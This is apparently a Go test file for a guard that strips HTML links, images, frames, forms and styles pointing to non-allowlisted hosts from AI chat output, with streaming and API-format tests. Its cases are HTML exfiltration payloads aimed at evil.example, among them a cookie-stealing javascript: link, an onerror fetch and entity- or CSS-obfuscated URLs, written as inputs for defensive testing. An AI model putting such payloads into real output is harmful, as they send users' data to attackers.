// Copyright 2026 The Guard Spec Authors
// SPDX-License-Identifier: Apache-2.0

package outputguard

import (
	"fmt"
	"strings"
	"testing"
)

// HTML elements that follow or load a URL: a chat interface that renders raw
// HTML shows them as links, images, frames, forms and the like. The guard
// removes those whose URL is not to an allowlisted host, as it removes a
// markdown link (the tag alone, the text up to </a> kept and checked) or
// image (a marker), and reads the tag as a browser does.
var htmlCases = []struct {
	name, in, want string
	counts         Counts
}{
	// Links: the start tag goes, its text stays.
	{"a href", `<a href="https://evil.example/?d=SECRET">x</a>`, "x</a>", Counts{KindLink: 1}},
	{"a href allowed", `<a href="https://docs.example.com/p">ok</a>`, `<a href="https://docs.example.com/p">ok</a>`, nil},
	{"single quotes, upper case", `<A HREF='https://evil.example/'>x</A>`, "x</A>", Counts{KindLink: 1}},
	{"unquoted", `<a href=https://evil.example/>x</a>`, "x</a>", Counts{KindLink: 1}},
	{"line breaks in the tag", "<a\nhref\n=\n\"https://evil.example/\"\n>x</a>", "x</a>", Counts{KindLink: 1}},
	{"slash before the attribute", `<a/href=https://evil.example/>x</a>`, "x</a>", Counts{KindLink: 1}},
	{"> in a quoted value", `<a title=">" href="https://evil.example/">x</a>`, "x</a>", Counts{KindLink: 1}},
	{"no blank between attributes", `<a title="t"href="https://evil.example/">x</a>`, "x</a>", Counts{KindLink: 1}},
	{"character references", `<a href="&#x68;ttps://evil.example/">x</a>`, "x</a>", Counts{KindLink: 1}},
	{"reference hiding the host", `<a href="https://docs.example.com&#64;evil.example/">x</a>`, "x</a>", Counts{KindLink: 1}},
	{"javascript", `<a href="javascript:fetch('//evil.example/?'+document.cookie)">x</a>`, "x</a>", Counts{KindLink: 1}},
	{"javascript with a line break", `<a href="java&#x0A;script:alert(1)">x</a>`, "x</a>", Counts{KindLink: 1}},
	{"data", `<a href="data:text/html,<script>alert(1)</script>">x</a>`, "x</a>", Counts{KindLink: 1}},
	{"ping", `<a href="https://docs.example.com/" ping="https://evil.example/p">x</a>`, "x</a>", Counts{KindLink: 1}},
	{"area", `<map><area shape=default href="https://evil.example/"></map>`, "<map></map>", Counts{KindLink: 1}},
	{"form", `<form action="https://evil.example/c"><input name=q value=S><button>Go</button></form>`,
		"<input name=q value=S><button>Go</button></form>", Counts{KindLink: 1}},
	{"formaction", `<button formaction="https://evil.example/c">Go</button>`, "Go</button>", Counts{KindLink: 1}},
	{"svg link", `<svg><a xlink:href="https://evil.example/"><text>x</text></a></svg>`,
		"<svg><text>x</text></a></svg>", Counts{KindLink: 1}},
	// The text of a removed link is checked like the rest, and what a removal
	// joins too.
	{"e-mail in link text", `<a href="https://evil.example/">mail a@b.com</a>`, "mail [REDACTED:email]</a>",
		Counts{KindLink: 1, KindEmail: 1}},
	{"phone joined", `call 0912<a href="https://evil.example/">345678 now`, "call [REDACTED:phone] now",
		Counts{KindLink: 1, KindPhone: 1}},
	{"canary joined", testCanary[:14] + `<a href=x>` + testCanary[14:], "[REDACTED:canary]",
		Counts{KindLink: 1, KindCanary: 1}},
	// What loads by itself: a marker.
	{"img srcset", `<img src="https://docs.example.com/a.png" srcset="https://docs.example.com/a.png 1x, https://evil.example/b.png 2x">`,
		"[REDACTED:image]", Counts{KindImage: 1}},
	{"img src entity", `<img src="https://evil.example&#x2F;p.png">`, "[REDACTED:image]", Counts{KindImage: 1}},
	{"img allowed", `<img src="https://docs.example.com/a.png" alt="ok">`, `<img src="https://docs.example.com/a.png" alt="ok">`, nil},
	{"source srcset", `<picture><source srcset="https://evil.example/a.png"><img src="https://docs.example.com/a.png"></picture>`,
		`<picture>[REDACTED:image]<img src="https://docs.example.com/a.png"></picture>`, Counts{KindImage: 1}},
	{"video poster", `<video src="https://docs.example.com/v.mp4" poster="https://evil.example/p.png?d=S"></video>`,
		"[REDACTED:image]</video>", Counts{KindImage: 1}},
	{"audio src", `<audio src=//evil.example/a.mp3 controls></audio>`, "[REDACTED:image]</audio>", Counts{KindImage: 1}},
	{"track src", `<video><track src="https://evil.example/t.vtt"></video>`, "<video>[REDACTED:image]</video>", Counts{KindImage: 1}},
	{"iframe", `<iframe src="https://evil.example/?d=S"></iframe>`, "[REDACTED:image]</iframe>", Counts{KindImage: 1}},
	{"iframe srcdoc", `<iframe srcdoc="&lt;img src=https://evil.example/x&gt;"></iframe>`, "[REDACTED:image]</iframe>",
		Counts{KindImage: 1}},
	{"embed", `<embed src="https://evil.example/x.swf">`, "[REDACTED:image]", Counts{KindImage: 1}},
	{"object", `<object data="https://evil.example/x.pdf"></object>`, "[REDACTED:image]</object>", Counts{KindImage: 1}},
	{"link", `<link rel=stylesheet href="https://evil.example/s.css">`, "[REDACTED:image]", Counts{KindImage: 1}},
	{"base", `<base href="https://evil.example/">`, "[REDACTED:image]", Counts{KindImage: 1}},
	{"input image", `<input type=image src="https://evil.example/b.png">`, "[REDACTED:image]", Counts{KindImage: 1}},
	{"background", `<table background="https://evil.example/t.png"><tr><td>x</td></tr></table>`,
		"[REDACTED:image]<tr><td>x</td></tr></table>", Counts{KindImage: 1}},
	{"svg image", `<svg><image href="https://evil.example/p.png"/></svg>`, "<svg>[REDACTED:image]</svg>", Counts{KindImage: 1}},
	{"svg animated href", `<svg><a><set attributeName="href" to="https://evil.example/"/><text>x</text></a></svg>`,
		"<svg><a>[REDACTED:image]<text>x</text></a></svg>", Counts{KindImage: 1}},
	{"style url", `<div style="background:url(https://evil.example/p.png?d=S)">x</div>`, "[REDACTED:image]x</div>",
		Counts{KindImage: 1}},
	{"style url quoted, entity", `<div style="background:&#x75;rl('https://evil.example/p.png')">x</div>`,
		"[REDACTED:image]x</div>", Counts{KindImage: 1}},
	{"style escape", `<div style="background:u\72 l(https://evil.example/p.png)">x</div>`, "[REDACTED:image]x</div>",
		Counts{KindImage: 1}},
	{"style image-set", `<div style="background:image-set('https://evil.example/p.png' 1x)">x</div>`,
		"[REDACTED:image]x</div>", Counts{KindImage: 1}},
	{"style allowed", `<div style="background:url('https://docs.example.com/p.png');color:red">x</div>`,
		`<div style="background:url('https://docs.example.com/p.png');color:red">x</div>`, nil},
	{"style element", "<style>body{background:url(https://evil.example/p.png)}</style>",
		"[REDACTED:image]body{background:url(https://evil.example/p.png)}</style>", Counts{KindImage: 1}},
	{"event handler", `<img src="https://docs.example.com/a.png" onerror="fetch('//evil.example/?'+1)">`,
		"[REDACTED:image]", Counts{KindImage: 1}},
	{"meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example/">`, "[REDACTED:image]",
		Counts{KindImage: 1}},
	// A tag inside another one's attribute: a browser reads it as a tag when
	// it does not read the other one as a tag, here inside a comment.
	{"tag inside an attribute", `<b title="<a href=https://evil.example/>x">t</b>`, `<b title="x">t</b>`,
		Counts{KindLink: 1}},
	{"tag after a comment", `<!-- <x title=" --> <a href="https://evil.example/">x</a> "> -->`,
		`<!-- <x title=" --> x</a> "> -->`, Counts{KindLink: 1}},
	{"too many tags inside one", `<x title="` + strings.Repeat("<b ", maxInnerTags+1) + `">t`, "[REDACTED:image]t",
		Counts{KindImage: 1}},
	// Text that is no tag a renderer follows stays.
	{"generics", "Map<String, List<Integer>> m; if a<b and c>d", "Map<String, List<Integer>> m; if a<b and c>d", nil},
	{"src on an element that loads nothing", `<b src="https://evil.example/">x</b>`, `<b src="https://evil.example/">x</b>`, nil},
	// A tag the answer ends in is read as it stands.
	{"open at the end", `text <a href="https://evil.example/?d=S`, "text ", Counts{KindLink: 1}},
	{"open img at the end", "text <img", "text [REDACTED:image]", Counts{KindImage: 1}},
	{"open allowed at the end", `text <a href="https://docs.example.com/`, `text <a href="https://docs.example.com/`, nil},
	// Markup rebuilt by a removal.
	{"rebuilt tag name", `<a[]() href="https://evil.example/">x</a>`, "x</a>", Counts{KindLink: 2}},
	{"rebuilt attribute", `<a hr[]()ef=https://evil.example/>x</a>`, "x</a>", Counts{KindLink: 2}},
	{"rebuilt tag start", `<[]()a href=https://evil.example/>x</a>`, "x</a>", Counts{KindLink: 2}},
	{"rebuilt img", `<[](x)img src=https://evil.example/p.png>`, "[REDACTED:image]", Counts{KindLink: 1, KindImage: 1}},
	{"tag in link text", `[<a href=https://evil.example/>x</a>](https://evil.example/)`, "x</a>", Counts{KindLink: 2}},
}

func TestHTMLWholeAnswer(t *testing.T) {
	s := propScanner(CanaryRedact)
	for _, tc := range htmlCases {
		counts := Counts{}
		got := s.Text(tc.in, counts)
		if got != tc.want {
			t.Errorf("%s: got %q, want %q", tc.name, got, tc.want)
		}
		if fmt.Sprint(counts) != fmt.Sprint(tc.counts) {
			t.Errorf("%s: counts %v, want %v", tc.name, counts, tc.counts)
		}
		checkNoLeaks(t, s, tc.in, got)
	}
}

// The checker finds every case in the answer as such, but those kept.
func TestHTMLCasesLeakAsSuch(t *testing.T) {
	g := propScanner(CanaryRedact).g
	for _, tc := range htmlCases {
		if tc.in == tc.want || strings.Contains(tc.name, "joined") || strings.Contains(tc.name, "rebuilt") ||
			strings.Contains(tc.name, "e-mail") || strings.Contains(tc.name, "inside") || strings.HasPrefix(tc.name, "open") {
			continue
		}
		if len(renderedLeaks(g, tc.in)) == 0 {
			t.Errorf("%s: the checker finds nothing in %q", tc.name, tc.in)
		}
	}
}

func TestHTMLStream(t *testing.T) {
	s := propScanner(CanaryRedact)
	for _, tc := range htmlCases {
		for _, in := range []string{tc.in, filler + tc.in, tc.in + "\n" + filler, filler + tc.in + " " + filler} {
			wantCounts := Counts{}
			want := s.Text(in, wantCounts)
			checkNoLeaks(t, s, in, want)
			for n := 1; n <= 70; n++ {
				checkStream(t, s, streamChunks(in, n), want, wantCounts)
			}
		}
	}
}

func TestHTMLEventStreams(t *testing.T) {
	r := &propRand{s: 23}
	for _, tc := range htmlCases {
		in := "Here: " + tc.in + " and more text after it."
		want := propScanner(CanaryRedact).Text(in, Counts{})
		leaked := strings.Contains(in, testCanary) || strings.Contains(tc.name, "canary")
		for _, n := range []int{1, 3, 16, 64} {
			deltas := streamChunks(in, n)
			for _, k := range sseKinds {
				checkSSE(t, r, CanaryRedact, k.name, in, deltas, want, false)
				checkSSE(t, r, CanaryBlock, k.name, in, deltas, want, leaked)
			}
		}
	}
}

// A tag open longer than maxOpen is removed whole, in a stream as in the
// whole answer, also while the rest of it is in a quoted value with ">".
func TestHTMLLongTag(t *testing.T) {
	s := propScanner(CanaryRedact)
	for _, in := range []string{
		`<a title="` + strings.Repeat("x>", maxOpen/2) + `" href="https://docs.example.com/">t</a> after`,
		`<a href="https://evil.example/?d=` + strings.Repeat("S", maxOpen) + `">t</a> after`,
		`<b title='` + strings.Repeat("y", maxOpen) + `'>t</b> after`,
		`a<b ` + strings.Repeat("z ", maxOpen) + `> after`,
	} {
		wantCounts := Counts{}
		want := s.Text(in, wantCounts)
		if !strings.Contains(want, marker(KindImage)) || !strings.HasSuffix(want, " after") {
			t.Errorf("%.40q…: got %.80q", in, want)
		}
		checkNoLeaks(t, s, in, want)
		for _, n := range []int{1, 7, 64, 1000} {
			checkStream(t, s, streamChunks(in, n), want, wantCounts)
		}
	}
}

// The whole-answer guard of each API removes HTML links too.
func TestHTMLWholeResponses(t *testing.T) {
	in := `x <a href="https://evil.example/?d=S">y</a> z`
	s := propScanner(CanaryRedact)
	bodies := []struct {
		name  string
		guard func([]byte, Counts) ([]byte, error)
		body  string
	}{
		{"chat", s.Response, `{"id":"c","object":"chat.completion","choices":[{"index":0,` +
			`"message":{"role":"assistant","content":` + jsonString(in) + `},"finish_reason":"stop"}]}`},
		{"messages", s.MessagesResponse, `{"id":"msg_1","type":"message","role":"assistant","model":"m",` +
			`"content":[{"type":"text","text":` + jsonString(in) + `}],"stop_reason":"end_turn"}`},
		{"responses", s.ResponsesResponse, `{"id":"resp_1","object":"response","status":"completed","model":"m",` +
			`"output":[{"type":"message","id":"msg_1","role":"assistant","status":"completed",` +
			`"content":[{"type":"output_text","text":` + jsonString(in) + `,"annotations":[]}]}]}`},
	}
	for _, b := range bodies {
		counts := Counts{}
		out, err := b.guard([]byte(b.body), counts)
		if err != nil {
			t.Fatalf("%s: %v", b.name, err)
		}
		if strings.Contains(string(out), "evil.example") || counts[KindLink] != 1 {
			t.Errorf("%s: counts %v, out %s", b.name, counts, out)
		}
	}
}

// Without an allowlist every such tag goes, and the rest of the config does
// not matter.
func TestHTMLBareConfig(t *testing.T) {
	s := New(Config{}).ForRequest("")
	for _, tc := range []struct{ in, want string }{
		{`<a href="https://docs.example.com/">x</a>`, "x</a>"},
		{`<img src="https://docs.example.com/a.png">`, "[REDACTED:image]"},
		{`<a name="top">x</a>`, `<a name="top">x</a>`},
	} {
		if got := s.Text(tc.in, Counts{}); got != tc.want {
			t.Errorf("%q: got %q, want %q", tc.in, got, tc.want)
		}
		for n := 1; n <= len(tc.in); n++ {
			if got, _ := streamed(s, tc.in, n); got != tc.want {
				t.Fatalf("%q in %d-byte pieces: got %q, want %q", tc.in, n, got, tc.want)
			}
		}
	}
}
